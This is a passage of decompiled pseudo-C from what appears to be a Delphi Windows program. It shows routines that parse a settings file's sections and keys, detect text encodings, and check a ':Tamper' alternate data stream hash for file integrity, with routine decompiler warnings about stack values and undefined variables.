  (*(void (__fastcall **)(_DWORD, _DWORD, int *, void *))(**(_DWORD **)(v9 + 20) + 24))(
    *(_DWORD *)(v9 + 20),
    **(_DWORD **)(v9 + 20),
    v7,
    &loc_43F1ED);
  result = sub_405588();
  if ( v8 > 0 )
    return System::__linkproc__ ClassDestroy(v9);
  return result;
}
// 4058C4: using guessed type int __fastcall System::__linkproc__ ClassDestroy(_DWORD);

//----- (0043F210) --------------------------------------------------------
int __usercall sub_43F210@<eax>(int a1@<eax>, int cchLength@<edx>, int a3@<edi>, int a4@<esi>)
{
  int v5; // ebx
  unsigned int v7[2]; // [esp-8h] [ebp-14h] BYREF
  int *v8; // [esp+0h] [ebp-Ch]
  _DWORD *v9; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v9 = (_DWORD *)a1;
  (*(void (__fastcall **)(_DWORD, _DWORD))(**(_DWORD **)(a1 + 20) + 20))(*(_DWORD *)(a1 + 20), **(_DWORD **)(a1 + 20));
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_43F2A3;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  v5 = sub_43EAE0(v9[1], cchLength, 0);
  if ( v5 >= 0 )
  {
    a4 = *(_DWORD *)(v9[1] + 4);
    if ( *(_DWORD *)(a4 + 8) <= (unsigned int)v5 )
      Idthreadcomponent::TIdThreadComponent::SetThreadName(*(Idthreadcomponent::TIdThreadComponent **)(v9[1] + 4), v5);
    sub_405598(*(_DWORD **)(*(_DWORD *)(a4 + 4) + 8 * v5 + 4));
    sub_43E9B0(v9[1], v5);
    *((_BYTE *)v9 + 8) = 1;
  }
  sub_43FE20(v9, (const void *)v5, a3, a4);
  __writefsdword(0, v7[0]);
  return (*(int (__fastcall **)(_DWORD, _DWORD, int *, void *))(*(_DWORD *)v9[5] + 24))(
           v9[5],
           *(_DWORD *)v9[5],
           v8,
           &loc_43F2AA);
}

//----- (0043F2B0) --------------------------------------------------------
int __fastcall sub_43F2B0(int a1)
{
  int *v1; // ecx
  unsigned int v3[2]; // [esp-8h] [ebp-10h] BYREF
  int *v4; // [esp+0h] [ebp-8h]
  int v5; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v5 = a1;
  (*(void (__fastcall **)(_DWORD, _DWORD))(**(_DWORD **)(a1 + 20) + 12))(*(_DWORD *)(a1 + 20), **(_DWORD **)(a1 + 20));
  v4 = &savedregs;
  v3[1] = (unsigned int)&loc_43F2F5;
  v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v3);
  HIBYTE(v4) = *(_BYTE *)(v5 + 16);
  v1 = v4;
  __writefsdword(0, v3[0]);
  v4 = (int *)&loc_43F2FC;
  (*(void (__fastcall **)(_DWORD, _DWORD, int *))(**(_DWORD **)(v5 + 20) + 16))(
    *(_DWORD *)(v5 + 20),
    **(_DWORD **)(v5 + 20),
    v1);
  return HIBYTE(v4);
}

//----- (0043F310) --------------------------------------------------------
_DWORD *__fastcall sub_43F310(
        int (__fastcall ***a1)(_DWORD, int, int, volatile __int32 *),
        int a2,
        void *a3,
        volatile __int32 *a4)
{
  int v4; // eax
  __int16 v6; // ax
  unsigned int v8[2]; // [esp-Ch] [ebp-20h] BYREF
  int *v9; // [esp-4h] [ebp-18h]
  void *v10[2]; // [esp+Ch] [ebp-8h] BYREF
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v10[0] = 0;
  v10[1] = a3;
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_43F3B2;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  sub_440830(a1, a2, (int)a3, 0, a4);
  v4 = *a4;
  if ( *a4 )
    v4 = *(_DWORD *)(v4 - 4);
  if ( v4 > 2 && **(_WORD **)a4 == 48 )
  {
    v6 = *(_WORD *)(*a4 + 2);
    if ( v6 == 88 || v6 == 120 )
    {
      sub_407AD8(*a4, 3, 0x7FFFFFFF, v10);
      sub_407968(a4, &str__[1]._top, (_DWORD *)v10[0]);
    }
  }
  __writefsdword(0, v8[0]);
  v9 = (int *)&loc_43F3B9;
  return sub_406C44(v10);
}
// 43F3C8: using guessed type _strings str__[1];

//----- (0043F3E0) --------------------------------------------------------
int __usercall sub_43F3E0@<eax>(int a1@<eax>, int a2@<edx>, int a3@<edi>)
{
  int v3; // ebx
  Idthreadcomponent::TIdThreadComponent *v4; // ebx
  int v5; // ebx
  Idthreadcomponent::TIdThreadComponent *v6; // ebx
  struct _EXCEPTION_REGISTRATION_RECORD *v8; // [esp-2Ch] [ebp-60h] BYREF
  void *v9; // [esp-28h] [ebp-5Ch]
  int *v10; // [esp-24h] [ebp-58h]
  struct _EXCEPTION_REGISTRATION_RECORD *v11; // [esp-20h] [ebp-54h] BYREF
  void *v12; // [esp-1Ch] [ebp-50h]
  int *v13; // [esp-18h] [ebp-4Ch]
  struct _EXCEPTION_REGISTRATION_RECORD *v14; // [esp-14h] [ebp-48h] BYREF
  void *v15; // [esp-10h] [ebp-44h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-40h] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *v17; // [esp-8h] [ebp-3Ch] BYREF
  int *v18; // [esp-4h] [ebp-38h]
  int *v19; // [esp+0h] [ebp-34h]
  int v20; // [esp+4h] [ebp-30h] BYREF
  int v21; // [esp+8h] [ebp-2Ch]
  int v22; // [esp+Ch] [ebp-28h]
  int v23; // [esp+10h] [ebp-24h]
  int v24; // [esp+14h] [ebp-20h]
  int System__AnsiString; // [esp+18h] [ebp-1Ch]
  int v26; // [esp+1Ch] [ebp-18h]
  int v27; // [esp+20h] [ebp-14h]
  __int32 v28; // [esp+24h] [ebp-10h] BYREF
  __int32 v29; // [esp+28h] [ebp-Ch] BYREF
  __int32 v30; // [esp+2Ch] [ebp-8h] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *v31; // [esp+30h] [ebp-4h] BYREF
  int savedregs; // [esp+34h] [ebp+0h] BYREF

  v20 = 0;
  v31 = 0;
  v30 = 0;
  v29 = 0;
  v28 = 0;
  v26 = a2;
  v27 = a1;
  v18 = &savedregs;
  v17 = (struct _EXCEPTION_REGISTRATION_RECORD *)&loc_43F6B2;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  (*(void (__fastcall **)(_DWORD, _DWORD, _DWORD, void *, struct _EXCEPTION_REGISTRATION_RECORD *))(**(_DWORD **)(a1 + 20)
                                                                                                  + 12))(
    *(_DWORD *)(a1 + 20),
    **(_DWORD **)(a1 + 20),
    0,
    &loc_43F6B2,
    ExceptionList);
  v19 = &savedregs;
  v18 = (int *)&loc_43F688;
  v17 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v17);
  if ( *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(v27 + 4) + 4) + 8) - 1 >= 0 )
  {
    v22 = *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(v27 + 4) + 4) + 8);
    System__AnsiString = 0;
    do
    {
      ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)&savedregs;
      v15 = &loc_43F52D;
      v14 = NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)&v14);
      v3 = *(_DWORD *)(v27 + 4);
      sub_406C44(&v30);
      v13 = &savedregs;
      v12 = &loc_43F4E9;
      v11 = NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)&v11);
      v10 = &savedregs;
      v9 = &loc_43F4CC;
      v8 = NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)&v8);
      v4 = *(Idthreadcomponent::TIdThreadComponent **)(v3 + 4);
      sub_406C44(&v30);
      if ( *((_DWORD *)v4 + 2) <= (unsigned int)System__AnsiString )
        Idthreadcomponent::TIdThreadComponent::SetThreadName(v4, System__AnsiString);
      sub_407030(&v30, *(_DWORD *)(*((_DWORD *)v4 + 1) + 8 * System__AnsiString));
      sub_407030((volatile __int32 *)&v31, v30);
      __writefsdword(0, (unsigned int)v8);
      v10 = (int *)&loc_43F4D3;
      sub_406C44(&v30);
      __writefsdword(0, (unsigned int)v17);
      v19 = (int *)&loc_43F4F0;
      sub_406C44(&v30);
      v18 = dword_43F6CC;
      v17 = v31;
      ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)&dword_43F6DC;
      sub_4079F0(&v20, 3);
      sub_429140(v26, v20, 0, a3);
      __writefsdword(0, (unsigned int)ExceptionList);
      v18 = (int *)&loc_43F534;
      sub_406C44(&v31);
      v5 = *(_DWORD *)(*(_DWORD *)(v27 + 4) + 4);
      if ( *(_DWORD *)(v5 + 8) <= (unsigned int)System__AnsiString )
        Idthreadcomponent::TIdThreadComponent::SetThreadName(
          *(Idthreadcomponent::TIdThreadComponent **)(*(_DWORD *)(v27 + 4) + 4),
          System__AnsiString);
      v23 = *(_DWORD *)(*(_DWORD *)(v5 + 4) + 8 * System__AnsiString + 4);
      if ( *(_DWORD *)(*(_DWORD *)(v23 + 4) + 8) - 1 >= 0 )
      {
        v21 = *(_DWORD *)(*(_DWORD *)(v23 + 4) + 8);
        v24 = 0;
        do
        {
          ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)&savedregs;
          v15 = &loc_43F644;
          v14 = NtCurrentTeb()->NtTib.ExceptionList;
          __writefsdword(0, (unsigned int)&v14);
          sub_406C44(&v28);
          v13 = &savedregs;
          v12 = &loc_43F61A;
          v11 = NtCurrentTeb()->NtTib.ExceptionList;
          __writefsdword(0, (unsigned int)&v11);
          v10 = &savedregs;
          v9 = &loc_43F5FD;
          v8 = NtCurrentTeb()->NtTib.ExceptionList;
          __writefsdword(0, (unsigned int)&v8);
          v6 = *(Idthreadcomponent::TIdThreadComponent **)(v23 + 4);
          sub_406C44(&v28);
          if ( *((_DWORD *)v6 + 2) <= (unsigned int)v24 )
            Idthreadcomponent::TIdThreadComponent::SetThreadName(v6, v24);
          sub_407030(&v28, *(_DWORD *)(*((_DWORD *)v6 + 1) + 8 * v24));
          sub_407030(&v29, v28);
          __writefsdword(0, (unsigned int)v8);
          v10 = (int *)&loc_43F604;
          sub_406C44(&v28);
          __writefsdword(0, (unsigned int)v17);
          v19 = (int *)&loc_43F621;
          sub_406C44(&v28);
          sub_429140(v26, v29, 0, a3);
          __writefsdword(0, (unsigned int)v17);
          v19 = (int *)&loc_43F64B;
          sub_406C44(&v29);
          ++v24;
          --v21;
        }
        while ( v21 );
      }
      sub_429140(v26, 0, 0, a3);
      ++System__AnsiString;
      --v22;
    }
    while ( v22 );
  }
  __writefsdword(0, (unsigned int)v17);
  (*(void (__fastcall **)(_DWORD, _DWORD, int *, __int32, __int32, int, int, int, int, int, int, int, int, void *))(**(_DWORD **)(v27 + 20) + 16))(
    *(_DWORD *)(v27 + 20),
    **(_DWORD **)(v27 + 20),
    v19,
    v29,
    v28,
    v27,
    v26,
    System__AnsiString,
    v24,
    v23,
    v22,
    v21,
    v20,
    &loc_43F68F);
  __writefsdword(0, (unsigned int)v17);
  v19 = (int *)&loc_43F6B9;
  sub_406C44(&v20);
  return sub_406CA4((int)&v28, 4);
}
// 43F6CC: using guessed type int dword_43F6CC[4];
// 43F6DC: using guessed type int dword_43F6DC;

//----- (0043F6E0) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
int __usercall sub_43F6E0@<eax>(char a1@<al>, int a2)
{
  int v2; // ebx
  int v3; // ebx
  Idthreadcomponent::TIdThreadComponent *v4; // ebx
  int v5; // ebx
  unsigned int v7[2]; // [esp-30h] [ebp-44h] BYREF
  void **v8; // [esp-28h] [ebp-3Ch]
  _DWORD v9[3]; // [esp-24h] [ebp-38h] BYREF
  _DWORD v10[3]; // [esp-18h] [ebp-2Ch] BYREF
  unsigned int v11[2]; // [esp-Ch] [ebp-20h] BYREF
  void **v12; // [esp-4h] [ebp-18h]
  int System__AnsiString; // [esp+4h] [ebp-10h]
  char v14; // [esp+Bh] [ebp-9h]
  unsigned __int32 v15; // [esp+Ch] [ebp-8h] BYREF
  __int32 v16; // [esp+10h] [ebp-4h] BYREF
  void *savedregs; // [esp+14h] [ebp+0h] BYREF

  v16 = 0;
  v15 = 0;
  v14 = a1;
  v12 = &savedregs;
  v11[1] = (unsigned int)&loc_43F87D;
  v11[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v11);
  System__AnsiString = sub_43EAE0(*(_DWORD *)(*(_DWORD *)(a2 - 4) + 4), *(_DWORD *)(a2 - 8), a1);
  if ( System__AnsiString >= 0 )
  {
    v2 = *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(a2 - 4) + 4) + 4);
    if ( *(_DWORD *)(v2 + 8) <= (unsigned int)System__AnsiString )
      Idthreadcomponent::TIdThreadComponent::SetThreadName(
        *(Idthreadcomponent::TIdThreadComponent **)(*(_DWORD *)(*(_DWORD *)(a2 - 4) + 4) + 4),
        System__AnsiString);
    v3 = *(_DWORD *)(*(_DWORD *)(v2 + 4) + 8 * System__AnsiString + 4);
    System__AnsiString = sub_43EB50(v3, *(_DWORD *)(a2 - 12), v14);
    if ( System__AnsiString >= 0 && *(_DWORD *)(a2 + 8) )
    {
      v10[2] = &savedregs;
      v10[1] = &loc_43F85B;
      v10[0] = NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)v10);
      sub_406C44(&v15);
      v9[2] = &savedregs;
      v9[1] = &loc_43F816;
      v9[0] = NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)v9);
      v8 = &savedregs;
      v7[1] = (unsigned int)&loc_43F7F9;
      v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)v7);
      v4 = *(Idthreadcomponent::TIdThreadComponent **)(v3 + 4);
      sub_406C44(&v15);
      if ( *((_DWORD *)v4 + 2) <= (unsigned int)System__AnsiString )
        Idthreadcomponent::TIdThreadComponent::SetThreadName(v4, System__AnsiString);
      sub_407030((volatile __int32 *)&v15, *(_DWORD *)(*((_DWORD *)v4 + 1) + 8 * System__AnsiString));
      sub_407030(&v16, v15);
      __writefsdword(0, v7[0]);
      v8 = (void **)&loc_43F800;
      sub_406C44(&v15);
      __writefsdword(0, v15);
      savedregs = &loc_43F81D;
      sub_406C44(&v15);
      v5 = *(_DWORD *)(a2 - 12);
      if ( v5 )
        v5 = *(_DWORD *)(v5 - 4);
      sub_407AD8(v16, v5 + 2, 0x7FFFFFFF, *(_DWORD **)(a2 + 8));
      __writefsdword(0, v15);
      savedregs = &loc_43F862;
      sub_406C44(&v16);
    }
  }
  __writefsdword(0, v11[0]);
  v12 = (void **)&loc_43F884;
  sub_406CA4((int)&v15, 2);
  return System__AnsiString;
}
// 43F810: bad sp value at call
// 43F855: bad sp value at call

//----- (0043F890) --------------------------------------------------------
int __fastcall sub_43F890(int a1, int a2, int a3, _DWORD *a4)
{
  int v4; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *v6; // [esp-18h] [ebp-28h] BYREF
  void *v7; // [esp-14h] [ebp-24h]
  int *v8; // [esp-10h] [ebp-20h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-1Ch] BYREF
  void *v10; // [esp-8h] [ebp-18h]
  int *v11; // [esp-4h] [ebp-14h]
  int v12; // [esp+0h] [ebp-10h]
  int v13; // [esp+4h] [ebp-Ch]
  int v14; // [esp+8h] [ebp-8h]
  int v15; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v13 = a3;
  v14 = a2;
  v15 = a1;
  if ( !(*(unsigned __int8 (__fastcall **)(int, int))(*(_DWORD *)a1 + 4))(a1, a3) )
  {
    (*(void (__fastcall **)(_DWORD))(**(_DWORD **)(v15 + 20) + 12))(*(_DWORD *)(v15 + 20));
    v11 = &savedregs;
    v10 = &loc_43F95A;
    ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&ExceptionList);
    v4 = sub_43F6E0(1, (int)&savedregs);
    if ( v4 >= 0 )
    {
      HIBYTE(v12) = 1;
      System::__linkproc__ TryFinallyExit(ExceptionList, v10, v11);
      return HIBYTE(v12);
    }
    if ( v4 == -2 )
    {
      (*(void (__fastcall **)(_DWORD))(**(_DWORD **)(v15 + 20) + 20))(*(_DWORD *)(v15 + 20));
      v8 = &savedregs;
      v7 = &loc_43F93A;
      v6 = NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)&v6);
      if ( sub_43F6E0(0, (int)&savedregs) >= 0 )
      {
        HIBYTE(v12) = 1;
        System::__linkproc__ TryFinallyExit(v6, v7, v8);
        System::__linkproc__ TryFinallyExit(ExceptionList, v10, v11);
        return HIBYTE(v12);
      }
      __writefsdword(0, (unsigned int)v6);
      (*(void (__fastcall **)(_DWORD, _DWORD, int *, int, int, int *, void *, struct _EXCEPTION_REGISTRATION_RECORD *, void *))(**(_DWORD **)(v15 + 20) + 24))(
        *(_DWORD *)(v15 + 20),
        **(_DWORD **)(v15 + 20),
        v8,
        v13,
        v12,
        v11,
        v10,
        ExceptionList,
        &loc_43F941);
    }
    __writefsdword(0, (unsigned int)ExceptionList);
    (*(void (__fastcall **)(_DWORD, _DWORD, int *, int, int, void *))(**(_DWORD **)(v15 + 20) + 16))(
      *(_DWORD *)(v15 + 20),
      **(_DWORD **)(v15 + 20),
      v11,
      v13,
      v12,
      &loc_43F961);
  }
  if ( a4 )
    sub_406C44(a4);
  HIBYTE(v12) = 0;
  return HIBYTE(v12);
}
// 406434: using guessed type _DWORD __stdcall System::__linkproc__ TryFinallyExit(_DWORD, _DWORD, _DWORD);

//----- (0043F980) --------------------------------------------------------
int __fastcall sub_43F980(int a1, int a2)
{
  int i; // esi
  unsigned __int16 v4; // bx
  bool v5; // cf
  unsigned __int8 v7; // [esp+13h] [ebp-1h]

  v7 = 0;
  for ( i = 1; i <= System::__linkproc__ LStrLen(a2); ++i )
  {
    v4 = *(_WORD *)(a2 + 2 * i - 2);
    if ( v4 != 32 )
    {
      v5 = v4 < 0xFFu;
      if ( v4 <= 0xFFu )
        v5 = _bittest(&dword_43F9E0, v4);
      if ( v5 )
        return 1;
      return v7;
    }
  }
  return v7;
}
// 4070F8: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 43F9E0: using guessed type int dword_43F9E0;

//----- (0043FA00) --------------------------------------------------------
int __fastcall sub_43FA00(int a1)
{
  int *v1; // ecx
  unsigned int v3[2]; // [esp-8h] [ebp-10h] BYREF
  int *v4; // [esp+0h] [ebp-8h]
  int v5; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v5 = a1;
  (*(void (__fastcall **)(_DWORD, _DWORD))(**(_DWORD **)(a1 + 20) + 12))(*(_DWORD *)(a1 + 20), **(_DWORD **)(a1 + 20));
  v4 = &savedregs;
  v3[1] = (unsigned int)&loc_43FA4C;
  v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v3);
  HIBYTE(v4) = *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(v5 + 4) + 4) + 8) <= 0;
  v1 = v4;
  __writefsdword(0, v3[0]);
  v4 = (int *)&loc_43FA53;
  (*(void (__fastcall **)(_DWORD, _DWORD, int *))(**(_DWORD **)(v5 + 20) + 16))(
    *(_DWORD *)(v5 + 20),
    **(_DWORD **)(v5 + 20),
    v1);
  return HIBYTE(v4);
}

//----- (0043FA60) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
_DWORD *__usercall sub_43FA60@<eax>(int a1@<eax>, _BYTE *a2@<edx>, int a3@<edi>)
{
  int v5; // ecx
  int v6; // eax
  int v7; // eax
  _BYTE *v8; // eax
  int v9; // eax
  void *v10; // edx
  __int32 v11; // eax
  unsigned int v13[2]; // [esp-18h] [ebp-30h] BYREF
  void **v14; // [esp-10h] [ebp-28h]
  int v15[5]; // [esp-Ch] [ebp-24h] BYREF
  int System__WideString; // [esp+8h] [ebp-10h] BYREF
  char v17; // [esp+Fh] [ebp-9h]
  Idthreadcomponent::TIdThreadComponent *v18; // [esp+10h] [ebp-8h]
  __int32 v19; // [esp+14h] [ebp-4h] BYREF
  void *savedregs; // [esp+18h] [ebp+0h] BYREF

  System__WideString = 0;
  v19 = 0;
  v15[2] = (int)&savedregs;
  v15[1] = (int)&loc_43FBE1;
  v15[0] = (int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v15);
  v17 = 1;
  sub_406C44(&v19);
  v6 = (int)a2;
  if ( a2 )
    v6 = *((_DWORD *)a2 - 1);
  if ( v6 > 0 )
  {
    v7 = (int)a2;
    if ( a2 )
      v7 = *((_DWORD *)a2 - 1);
    if ( v7 > 2 )
    {
      if ( *a2 == 0xFF && a2[1] == 0xFE )
      {
        v17 = 2;
        v8 = a2;
        if ( a2 )
          v8 = (_BYTE *)*((_DWORD *)a2 - 1);
        sub_407890(&v19, (int)(v8 - 2) / 2, v5);
        v9 = v19;
        if ( v19 )
          v9 = *(_DWORD *)(v19 - 4);
        if ( v9 > 0 )
        {
          v10 = (void *)sub_4071C0(&v19);
          v11 = v19;
          if ( v19 )
            v11 = *(_DWORD *)(v19 - 4);
          System::Move(a2 + 2, v10, 2 * v11);
        }
      }
      else if ( *a2 == 0xEF && a2[1] == 0xBB && a2[2] == 0xBF )
      {
        v17 = 3;
        sub_407510((int)a2, 4, 0x7FFFFFFF, &System__WideString);
        System::UTF8Encode(System__WideString);
      }
    }
    if ( v17 == 1 )
      sub_407840(&v19, (int)a2, v15[0]);
  }
  if ( !*(_BYTE *)(a1 + 16) && (unsigned __int8)(v17 - 1) < 2u )
    *(_BYTE *)(a1 + 16) = v17;
  v18 = (Idthreadcomponent::TIdThreadComponent *)sub_405568((int)cls_CrossPlatform_TUnicodeStringList, 1);
  v14 = &savedregs;
  v13[1] = (unsigned int)&loc_43FBBC;
  v13[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v13);
  sub_4289D0(v18, v19);
  sub_440E30(a1, v18, a3);
  __writefsdword(0, v13[0]);
  v14 = (void **)&loc_43FBC3;
  sub_405598(v18);
  __writefsdword(0, (unsigned int)v18);
  savedregs = &loc_43FBE8;
  sub_406C68(&System__WideString);
  return sub_406C44(&v19);
}
// 43FBD3: bad sp value at call
// 43FBDB: bad sp value at call
// 43FAE0: variable 'v5' is possibly undefined
// 4232BC: using guessed type int (*cls_CrossPlatform_TUnicodeStringList[3])();

//----- (0043FBF0) --------------------------------------------------------
_DWORD *__usercall sub_43FBF0@<eax>(int a1@<eax>, _DWORD **a2@<edi>, int a3@<esi>)
{
  int i; // ebx
  int v4; // ecx
  _DWORD *v5; // ebx
  int v6; // edi
  int v7; // eax
  __int64 v8; // rax
  bool v9; // al
  int *v11; // [esp-1Ch] [ebp-7Ch]
  struct _EXCEPTION_REGISTRATION_RECORD *v12; // [esp-18h] [ebp-78h] BYREF
  void *v13; // [esp-14h] [ebp-74h]
  int *v14; // [esp-10h] [ebp-70h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-6Ch] BYREF
  void *v16; // [esp-8h] [ebp-68h]
  int *v17; // [esp-4h] [ebp-64h]
  void *v18; // [esp+0h] [ebp-60h]
  int v19; // [esp+Ch] [ebp-54h] BYREF
  int v20; // [esp+10h] [ebp-50h] BYREF
  int v21; // [esp+14h] [ebp-4Ch]
  int v22; // [esp+18h] [ebp-48h]
  int v23; // [esp+1Ch] [ebp-44h]
  int v24; // [esp+20h] [ebp-40h]
  int v25; // [esp+24h] [ebp-3Ch]
  int v26; // [esp+28h] [ebp-38h]
  int v27; // [esp+2Ch] [ebp-34h]
  int v28[4]; // [esp+30h] [ebp-30h] BYREF
  _DWORD v29[4]; // [esp+40h] [ebp-20h] BYREF
  _DWORD *v30; // [esp+50h] [ebp-10h] BYREF
  Classes::TStream *v31; // [esp+54h] [ebp-Ch]
  int v32; // [esp+58h] [ebp-8h]
  int v33; // [esp+5Ch] [ebp-4h] BYREF
  int savedregs; // [esp+60h] [ebp+0h] BYREF

  v19 = 0;
  v33 = 0;
  v32 = a1;
  v17 = &savedregs;
  v16 = &loc_43FDEF;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_43EF00(a1);
  if ( *(_DWORD *)(v32 + 12) )
  {
    for ( i = 1; i != 11; ++i )
    {
      v31 = (Classes::TStream *)sub_425590(*(_DWORD *)(v32 + 12), 1);
      if ( v31 )
        break;
      if ( !(unsigned __int8)sub_426B00(*(_DWORD *)(v32 + 12)) )
        break;
      Sleep_0(3 * i);
    }
    if ( v31 )
    {
      v14 = &savedregs;
      v13 = &loc_43FC9C;
      v12 = NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)&v12);
      sub_423EB0(v31, &v33);
      __writefsdword(0, (unsigned int)v12);
      v14 = (int *)&loc_43FCA3;
      sub_405598(v31);
      if ( *(_BYTE *)(v32 + 17) )
      {
        *(_BYTE *)(v32 + 18) = 1;
        sub_407968(&v19, *(_DWORD **)(v32 + 12), L":Tamper");
        v30 = (_DWORD *)sub_425590(v19, 1);
        if ( v30 )
        {
          v14 = &savedregs;
          v13 = &loc_43FDBF;
          v12 = NtCurrentTeb()->NtTib.ExceptionList;
          __writefsdword(0, (unsigned int)&v12);
          v5 = *(_DWORD **)(Sysinit::__linkproc__ GetTls() + 28);
          if ( !v5 )
          {
            v11 = (int *)(Sysinit::__linkproc__ GetTls() + 28);
            *v11 = sub_4389D0(0, (int)a2, a3);
            v5 = *(_DWORD **)(Sysinit::__linkproc__ GetTls() + 28);
          }
          v6 = v33;
          if ( v33 )
            v6 = *(_DWORD *)(v33 - 4);
          (*(void (__fastcall **)(_DWORD *, _DWORD, int, void *, struct _EXCEPTION_REGISTRATION_RECORD *))*v5)(
            v5,
            *v5,
            v4,
            v13,
            v12);
          v7 = sub_4074F8(v33);
          (*(void (__fastcall **)(_DWORD *, int, int))(*v5 + 4))(v5, v7, v6);
          (*(void (__fastcall **)(_DWORD *, int *))(*v5 + 24))(v5, &v20);
          v24 = v20;
          v25 = v21;
          v26 = v22;
          v27 = v23;
          v29[0] = v20;
          v29[1] = v21;
          v29[2] = v22;
          v29[3] = v23;
          a2 = &v30;
          sub_439190(v28);
          LODWORD(v8) = (*(int (__fastcall **)(_DWORD *))*v30)(v30);
          if ( v8 >= 16 && (*(int (__fastcall **)(_DWORD *, int *, int))(*v30 + 12))(v30, v28, 16) == 16 )
          {
            v9 = sub_439160(v28, (int)v29);
            *(_BYTE *)(v32 + 18) = !v9;
          }
          __writefsdword(0, (unsigned int)v16);
          v18 = &loc_43FDC6;
          sub_405598(v30);
        }
      }
      sub_43FA60(v32, (_BYTE *)v33, (int)a2);
    }
  }
  __writefsdword(0, (unsigned int)ExceptionList);
  v17 = (int *)&loc_43FDF6;
  sub_406C44(&v19);
  return sub_406C68(&v33);
}
// 43FD31: variable 'v4' is possibly undefined
// 43FD7B: variable 'v8' is possibly undefined
// 43FE0C: using guessed type wchar_t aTamper[8];
// 43FBF0: using guessed type _DWORD var_20[4];
// 43FBF0: using guessed type int var_30[4];

//----- (0043FE20) --------------------------------------------------------
_DWORD *__usercall sub_43FE20@<eax>(_DWORD *result@<eax>, const void *a2@<ebx>, int a3@<edi>, int a4@<esi>)
{
  if ( *((_BYTE *)result + 8) )
  {
    if ( *((_BYTE *)result + 9) )
      return sub_440870((int)result, a2, a3, a4);
  }
  return result;
}

//----- (004400F0) --------------------------------------------------------
int __fastcall sub_4400F0(int a1, int a2, int a3)
{
  int v4; // [esp-Ch] [ebp-18h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-8h] [ebp-14h] BYREF
  void *v6; // [esp-4h] [ebp-10h]
  int *v7; // [esp+0h] [ebp-Ch]
  int v8; // [esp+4h] [ebp-8h]
  int v9; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v9 = a3;
  v7 = (int *)a2;
  v8 = a1;
  (*(void (__fastcall **)(_DWORD, _DWORD))(**(_DWORD **)(a1 + 20) + 12))(*(_DWORD *)(a1 + 20), **(_DWORD **)(a1 + 20));
  v7 = &savedregs;
  v6 = &loc_440181;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  if ( sub_43FED0(&savedregs) == -2 )
  {
    (*(void (__fastcall **)(_DWORD, _DWORD, int, struct _EXCEPTION_REGISTRATION_RECORD *))(**(_DWORD **)(v8 + 20) + 20))(
      *(_DWORD *)(v8 + 20),
      **(_DWORD **)(v8 + 20),
      v4,
      ExceptionList);
    v7 = &savedregs;
    v6 = &loc_440161;
    ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&ExceptionList);
    sub_43FED0(&savedregs);
    __writefsdword(0, (unsigned int)ExceptionList);
    (*(void (__fastcall **)(_DWORD, _DWORD, int *, void *))(**(_DWORD **)(v8 + 20) + 24))(
      *(_DWORD *)(v8 + 20),
      **(_DWORD **)(v8 + 20),
      v7,
      &loc_440168);
  }
  __writefsdword(0, (unsigned int)ExceptionList);
